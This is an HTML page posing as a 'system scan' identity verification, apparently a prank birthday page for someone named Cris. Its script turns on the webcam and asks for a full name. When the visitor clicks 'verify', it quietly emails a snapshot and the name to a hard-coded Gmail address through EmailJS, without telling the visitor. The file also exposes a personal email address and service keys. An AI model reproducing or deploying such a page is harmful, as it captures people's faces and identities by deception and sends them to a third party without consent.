<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification</title>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <style>
        body { background: #000; color: #00f2ff; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        #video-container { width: 250px; height: 250px; border: 3px solid #00f2ff; border-radius: 50%; overflow: hidden; position: relative; }
        video { width: 100%; height: 100%; object-fit: cover; }
        .scan { position: absolute; width: 100%; height: 4px; background: #00f2ff; top: 0; animation: move 2s infinite; display: none; }
        @keyframes move { 0% { top: 0; } 100% { top: 100%; } }
        button { margin-top: 20px; padding: 15px 30px; background: #00f2ff; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; }
        input { margin: 10px; padding: 10px; border-radius: 5px; border: none; text-align: center; }
        #message { display: none; text-align: center; color: white; padding: 20px; }
    </style>
</head>
<body>

    <div id="capture-site">
        <h2>SYSTEM SCAN</h2>
        <div id="video-container">
            <video id="webcam" autoplay playsinline></video>
            <div id="scanner" class="scan"></div>
        </div>
        <input type="text" id="userName" placeholder="Full Name">
        <button onclick="captureAndSend()">VERIFY IDENTITY</button>
    </div>

    <div id="message">
        <h1>ACCESS GRANTED</h1>
        <p>Happy Birthday, Cris! Check your messages.</p>
    </div>

    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        (function() { emailjs.init("A996XaJv7m7qD29bh"); })();

        const video = document.getElementById('webcam');
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => { video.srcObject = stream; })
            .catch(err => alert("Camera access required!"));

        function captureAndSend() {
            const name = document.getElementById('userName').value;
            if (!name) return alert("Name required");

            document.getElementById('scanner').style.display = 'block';

            // Capture
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const photo = canvas.toDataURL('image/jpeg', 0.7);

            // Send
            emailjs.send("service_7urz7m7", "template_7mr2oqu", {
                full_name: name,
                image_data: photo,
                to_email: "refuerzojay7@gmail.com"
            }).then(() => {
                // Show Success
                document.getElementById('capture-site').style.display = 'none';
                document.getElementById('message').style.display = 'block';
            });
        }
    </script>
</body>
</html>
